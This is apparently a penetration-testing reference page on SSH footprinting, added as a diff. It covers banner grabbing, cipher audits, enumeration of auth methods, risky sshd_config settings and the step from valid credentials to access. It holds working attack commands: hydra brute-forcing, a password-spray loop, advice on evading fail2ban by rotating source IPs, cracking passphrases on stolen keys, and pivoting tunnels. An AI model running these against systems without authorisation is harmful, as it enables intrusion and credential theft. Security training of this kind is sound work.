@@ -1,0 +1,390 @@
+---
+title: SSH
+description: SSH footprinting - banner version disclosure, ssh-audit cipher/auth analysis, authentication-method enumeration, dangerous sshd_config settings, and the path from valid credentials to host access.
+mitre: [T1046, T1078, T1110.001, T1021.004]
+d3fend: [D3-NTA, D3-MENCR]
+impact: [InternalAccess, CredentialTheft]
+sidebar:
+  order: 13
+  label: SSH
+---
+
+## TL;DR
+
+SSH is the dominant Linux/Unix remote-access protocol. Default port TCP 22. Unlike most other footprinted services, SSH is genuinely well-hardened by default - successful unauthenticated attacks against modern OpenSSH are rare. The operator's work here is identifying *misconfigurations* and *weak credentials*, not protocol-level exploitation. Banner version, supported algorithms, allowed authentication methods, and password-based-auth-enabled flags are the data points to collect.
+
+```
+# 1. Service scan
+nmap -sV -sC -p22 <target>
+
+# 2. Banner / cipher audit
+ssh-audit <target>
+
+# 3. Enumerate accepted authentication methods
+ssh -v -o PreferredAuthentications=none <target>
+
+# 4. Username enumeration via timing (some OpenSSH versions)
+nmap -p22 --script ssh-auth-methods --script-args ssh.user=root <target>
+
+# 5. Brute-force (with care - fail2ban catches you fast)
+hydra -L users.txt -P passwords.txt -t 4 -V ssh://<target>
+```
+
+Success indicator: banner reveals version + OS hint, ssh-audit identifies weak algorithms, password authentication confirmed available, and (best case) credentials succeed.
+
+## Protocol overview
+
+SSH (Secure Shell) provides encrypted authentication and command execution. The default daemon is OpenSSH (`sshd`). The protocol has three layers:
+
+| Layer | Purpose |
+| --- | --- |
+| **Transport** | Key exchange, server authentication, encryption setup. Result: an encrypted channel with the server proven authentic via its host key. |
+| **User authentication** | Methods like password, public key, GSSAPI, keyboard-interactive |
+| **Connection** | Multiplexed channels - shell sessions, port forwards, X11 forwarding |
+
+### Authentication methods
+
+| Method | Default? | Detail |
+| --- | --- | --- |
+| `password` | Yes (on most distros) | Username + password against `/etc/passwd` / PAM |
+| `publickey` | Yes | Client proves possession of a private key whose public counterpart is in `~/.ssh/authorized_keys` |
+| `keyboard-interactive` | Yes | Challenge-response - used for 2FA prompts, PAM modules |
+| `gssapi-with-mic` | Yes on AD-integrated installs | Kerberos auth |
+| `hostbased` | Off | Trust based on the client host's key |
+
+The list of *acceptable* methods is what `sshd` advertises to clients during auth negotiation. The list of methods actually *enabled* server-side depends on `sshd_config`.
+
+### Version conventions
+
+OpenSSH version strings encode the version and patch level: `OpenSSH_8.2p1 Ubuntu-4ubuntu0.5`. Major version + distro identifier helps narrow OS family and patch level.
+
+## Default configuration - OpenSSH
+
+`/etc/ssh/sshd_config` defaults (Debian/Ubuntu, current):
+
+```
+Port 22
+ListenAddress 0.0.0.0
+ListenAddress ::
+
+Protocol 2
+
+HostKey /etc/ssh/ssh_host_rsa_key
+HostKey /etc/ssh/ssh_host_ecdsa_key
+HostKey /etc/ssh/ssh_host_ed25519_key
+
+LoginGraceTime 2m
+PermitRootLogin prohibit-password           # was "yes" before 7.0, now "prohibit-password"
+StrictModes yes
+MaxAuthTries 6
+MaxSessions 10
+
+PubkeyAuthentication yes
+PasswordAuthentication yes
+PermitEmptyPasswords no
+ChallengeResponseAuthentication no
+UsePAM yes
+
+AllowAgentForwarding yes
+AllowTcpForwarding yes
+PermitTunnel no
+GatewayPorts no
+X11Forwarding no
+PrintMotd yes
+TCPKeepAlive yes
+```
+
+For most distros this is a reasonable baseline:
+
+- Root login disabled for password (`prohibit-password` allows key-based root)
+- 6 auth attempts per connection (combined with fail2ban this caps abuse)
+- Both password and pubkey auth allowed (operator-relevant - password auth is the brute-force path)
+- TCP forwarding allowed (an SSH session can become a pivot)
+
+## Dangerous settings
+
+| Setting | What it enables |
+| --- | --- |
+| `PermitRootLogin yes` | Root login with password - direct brute-force target |
+| `PermitRootLogin without-password` | Root with key - operationally same as default `prohibit-password` |
+| `PermitEmptyPasswords yes` | Accounts with empty passwords accepted (rare but devastating) |
+| `PasswordAuthentication yes` + weak password policy | Brute-forceable |
+| `PermitTunnel point-to-point` (or `ethernet`) | SSH can be used to build VPN-like tunnels |
+| `GatewayPorts yes` | Remote port forwards can bind to non-localhost - used by attackers to expose internal services through a compromised SSH host |
+| `AllowTcpForwarding yes` (default) | Combined with valid creds, you can pivot through this host |
+| `X11Forwarding yes` | Allows X11 - has been a vector for X11-cookie theft |
+| `Subsystem sftp` with no `ChrootDirectory` | SFTP users can roam the whole filesystem |
+| `Match User <name>` with reduced restrictions | Sometimes admins relax settings for specific users - find these via behavioral testing |
+| `AcceptEnv *` | Allows clients to set arbitrary env vars - historic vector for `LD_PRELOAD`-style attacks |
+| Old protocol version 1 (`Protocol 1`) | Cryptographically broken; should be disabled in OpenSSH 7+ but legacy systems persist |
+| Weak ciphers / MACs / KEX algorithms | Identifiable via ssh-audit; some have known weaknesses |
+
+The single highest-impact misconfig: `PasswordAuthentication yes` on an internet-exposed host without rate limiting + accounts with weak passwords. Botnet credential-spray works against millions of such hosts daily.
+
+## Footprinting commands
+
+### Banner grab
+
+```shell
+nc -nv 10.129.14.128 22
+```
+
+```
+(UNKNOWN) [10.129.14.128] 22 (ssh) open
+SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+```
+
+The banner alone identifies:
+- SSH protocol version (`2.0`)
+- Server implementation (`OpenSSH`)
+- Daemon version (`8.2p1`)
+- Distro hint (`Ubuntu-4ubuntu0.5` - Ubuntu's downstream patch level)
+
+That distro hint is valuable: Ubuntu's patch identifier maps to a specific Ubuntu release (`Ubuntu-4ubuntu0.5` ≈ Ubuntu 20.04). Cross-reference with the [Ubuntu USN database](https://ubuntu.com/security/notices) for patched-vs-unpatched determination.
+
+### Service scan
+
+```shell
+sudo nmap 10.129.14.128 -sV -sC -p22
+```
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 9d:b8:eb:cb:11:b9:78:7d:6a:f3:ad:88:f8:c4:1a:97 (RSA)
+|   256  d6:fd:51:65:5d:79:b6:62:0a:80:53:65:0b:0f:80:a3 (ECDSA)
+|_  256  79:00:5e:8e:b0:38:f3:5e:e4:51:43:67:b8:32:7e:78 (ED25519)
+```
+
+The host-key fingerprints help with two things:
+
+1. **Identifying duplicate hosts.** Many cloud-deployed hosts share the same first-boot key. Same fingerprint = images from the same template = often same credentials.
+2. **Detecting MITM** in repeat connections (verify the same fingerprint each time).
+
+### ssh-audit
+
+[ssh-audit](https://github.com/jtesta/ssh-audit) is the comprehensive analyzer:
+
+```shell
+ssh-audit 10.129.14.128
+```
+
+```
+(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+(gen) software: OpenSSH 8.2p1
+(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+
+(gen) compression: enabled (zlib@openssh.com)
+
+(kex) curve25519-sha256                       -- [info] available since OpenSSH 7.4
+(kex) curve25519-sha256@libssh.org            -- [info] available since OpenSSH 6.5
+(kex) ecdh-sha2-nistp256                      -- [warn] using weak elliptic curves
+(kex) ecdh-sha2-nistp384                      -- [warn] using weak elliptic curves
+(kex) diffie-hellman-group-exchange-sha256    -- [warn] using DH group exchange (might be weak)
+(kex) diffie-hellman-group16-sha512           -- [info] available since OpenSSH 7.3
+(kex) diffie-hellman-group18-sha512           -- [info] available since OpenSSH 7.3
+(kex) diffie-hellman-group14-sha256           -- [warn] using weak hashing algorithm
+(kex) diffie-hellman-group14-sha1             -- [fail] using broken SHA-1 hashing algorithm
+
+(key) rsa-sha2-512                            -- [info] available since OpenSSH 7.2
+(key) rsa-sha2-256                            -- [info] available since OpenSSH 7.2
+(key) ssh-rsa                                 -- [fail] using broken SHA-1 hashing algorithm
+(key) ecdsa-sha2-nistp256                     -- [warn] using weak elliptic curves
+(key) ssh-ed25519                             -- [info] best practice
+
+(enc) chacha20-poly1305@openssh.com           -- [info] AES-NI accelerated
+(enc) aes128-ctr                              -- [info] available since OpenSSH 3.7
+(enc) aes192-ctr                              -- [info] available since OpenSSH 3.7
+(enc) aes256-ctr                              -- [info] available since OpenSSH 3.7
+(enc) aes128-gcm@openssh.com                  -- [info] available since OpenSSH 6.2
+(enc) aes256-gcm@openssh.com                  -- [info] available since OpenSSH 6.2
+
+(mac) umac-64-etm@openssh.com                 -- [warn] using small 64-bit tag size
+(mac) umac-128-etm@openssh.com                -- [info] available since OpenSSH 6.2
+(mac) hmac-sha2-256-etm@openssh.com           -- [info] available since OpenSSH 6.2
+(mac) hmac-sha2-512-etm@openssh.com           -- [info] available since OpenSSH 6.2
+(mac) hmac-sha1-etm@openssh.com               -- [fail] using broken SHA-1 hashing algorithm
+(mac) hmac-sha1                               -- [fail] using broken SHA-1 hashing algorithm
+```
+
+What this gives you:
+
+- **(kex)** - key exchange algorithms. `diffie-hellman-group14-sha1` and similar flagged as "broken" with SHA-1
+- **(key)** - host key types. `ssh-rsa` with SHA-1 is now deprecated in OpenSSH 8.7+
+- **(enc)** - cipher suites
+- **(mac)** - MAC algorithms
+
+Flagged `fail` items aren't immediately exploitable but indicate a configuration that hasn't been hardened. Useful as compliance/audit findings.
+
+### Authentication-method enumeration
+
+```shell
+ssh -v -o PreferredAuthentications=none -o StrictHostKeyChecking=no \
+    user@10.129.14.128
+```
+
+```
+debug1: Local version string SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+debug1: Remote protocol version 2.0, remote software version OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+debug1: Authenticating to 10.129.14.128:22 as 'user'
+debug1: kex: ...
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: publickey
+debug1: Trying private key: /home/you/.ssh/id_rsa
+debug1: Trying private key: /home/you/.ssh/id_ed25519
+debug1: No more authentication methods to try.
+Permission denied (publickey,password).
+```
+
+Key data points from the verbose output:
+
+- **`Authentications that can continue: publickey,password`** - methods accepted by the server for this username. If `password` appears, brute-force is on the table.
+- If you see `Authentications that can continue: publickey` only - password auth is disabled. Move to key-based approaches (find a stolen key, social-engineer, or look for the user's `authorized_keys` written elsewhere).
+- If `keyboard-interactive` appears → some form of 2FA or PAM module is active.
+
+A faster way:
+
+```shell
+nmap -p22 --script ssh-auth-methods --script-args="ssh.user=root" 10.129.14.128
+```
+
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-auth-methods:
+|   Supported authentication methods:
+|     publickey
+|_    password
+```
+
+### Username enumeration
+
+Older OpenSSH versions had timing-based username enumeration:
+- `CVE-2018-15473` (OpenSSH < 7.7) - different timing for valid vs invalid usernames
+- `CVE-2016-6210` (OpenSSH < 7.3) - different timing on long passwords
+
+Exploitation:
+
+```shell
+# Metasploit module
+msf > use auxiliary/scanner/ssh/ssh_enumusers
+msf > set RHOSTS <target>
+msf > set USER_FILE users.txt
+msf > set CHECK_FALSE true     # also verify against known-invalid baseline
+msf > run
+```
+
+For modern OpenSSH (7.7+), these are patched. Don't rely on timing enumeration without first confirming the version is in scope.
+
+### Brute-force with rate-limiting awareness
+
+```shell
+hydra -L users.txt -P passwords.txt -t 4 -V ssh://10.129.14.128
+```
+
+`-t 4` runs 4 concurrent threads. Going higher gets you blocked. Most modern Linux distros run **fail2ban** out of the box - after 5 failed attempts from one source, your IP gets blocked for 10+ minutes via iptables.
+
+Detect fail2ban behaviorally:
+- First few attempts: connect immediately, get error, retry
+- After ~5 failures: connections start hanging (firewall dropping packets)
+- After lockout window: connections work again
+
+When fail2ban is in the way:
+- Slow down (`-t 1`, sleep between attempts)
+- Rotate source IPs (multiple proxies, multiple cloud instances)
+- Switch to a different attack - credential dumps from leaked databases, internal-only access via VPN
+
+### Single-credential validation
+
+When you want to test one cred without the noise:
+
+```shell
+sshpass -p 'P4ssw0rd!' ssh -o StrictHostKeyChecking=no user@10.129.14.128
+```
+
+`sshpass` automates the password prompt. Combine with a small loop for spraying ONE password across many users (the inverted brute-force pattern):
+
+```shell
+for user in $(cat users.txt); do
+  sshpass -p 'Spring2024!' ssh -o StrictHostKeyChecking=no \
+                            -o BatchMode=no \
+                            -o ConnectTimeout=4 \
+                            "$user@10.129.14.128" 'whoami' 2>&1 \
+    | grep -v "Permission denied" | head -3
+done
+```
+
+This pattern is much friendlier to fail2ban because each attempt is from the same source against different usernames - fail2ban typically blocks the source for repeatedly failing a *single account*, not for one failure per account.
+
+### Using a stolen/found private key
+
+```shell
+chmod 600 found_id_rsa
+ssh -i found_id_rsa user@10.129.14.128
+```
+
+If the key is passphrase-protected, crack the passphrase with `ssh2john` + `hashcat`:
+
+```shell
+ssh2john found_id_rsa > id_rsa.hash
+hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt
+```
+
+### SSH tunnels / pivoting
+
+Once you have SSH access, the connection is a pivot:
+
+```shell
+# Local port forward: target_internal:80 reachable as localhost:8080
+ssh -L 8080:internal-host:80 user@<jump>
+
+# Dynamic SOCKS proxy (route any traffic through the jump host)
+ssh -D 1080 user@<jump>
+# Then use proxychains or browser-level SOCKS5 to use it
+
+# Remote port forward (your local service exposed to the remote network)
+ssh -R 4444:127.0.0.1:4444 user@<jump>
+# Useful for callback shells from networks that can't egress
+```
+
+If `AllowTcpForwarding no` is set, these don't work - `sshuttle` is the fallback (works over a plain shell session).
+
+## Common chained workflows
+
+**Banner → version-specific CVE:**
+1. Banner shows OpenSSH version
+2. Cross-reference with CVE database
+3. Test (carefully - most SSH CVEs are DoS or info-leak, not RCE)
+
+**Stolen key from NFS → SSH access:**
+1. NFS export contains user home directories with `.ssh/id_rsa` (see [NFS](/codex/network/services/nfs/))
+2. Copy the key
+3. `ssh -i stolen_key user@target` - instant access
+
+**SMB/SQL creds → SSH spray:**
+1. Found valid `cry0l1t3:Pass123` via SMB
+2. Spray that pair across SSH targets in the same network
+3. Password reuse is endemic; one finding often opens many doors
+
+**SSH access → tunnel → internal-only services:**
+1. SSH to the bastion host
+2. `ssh -D 1080 user@bastion` opens a SOCKS proxy
+3. `proxychains nmap -sT 10.0.0.0/24` scans the internal network from inside the bastion's perspective
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Banner grab | `nc -nv <target> 22` |
+| Service scan | `nmap -sV -sC -p22 <target>` |
+| Cipher audit | `ssh-audit <target>` |
+| Auth methods | `ssh -v -o PreferredAuthentications=none user@<target>` |
+| Auth methods (NSE) | `nmap -p22 --script ssh-auth-methods --script-args ssh.user=root <target>` |
+| User enum (old SSH) | `msf > use auxiliary/scanner/ssh/ssh_enumusers` |
+| Brute-force | `hydra -L users -P pass -t 4 ssh://<target>` |
+| One-shot password | `sshpass -p '<pass>' ssh user@<target>` |
+| Key login | `ssh -i <key> user@<target>` |
+| Crack key passphrase | `ssh2john key > h && hashcat -m 22921 h wordlist` |
+| Local port forward | `ssh -L <local>:<host>:<port> user@<jump>` |
+| SOCKS proxy | `ssh -D 1080 user@<jump>` |
+| Remote port forward | `ssh -R <remote>:<local-host>:<local-port> user@<jump>` |
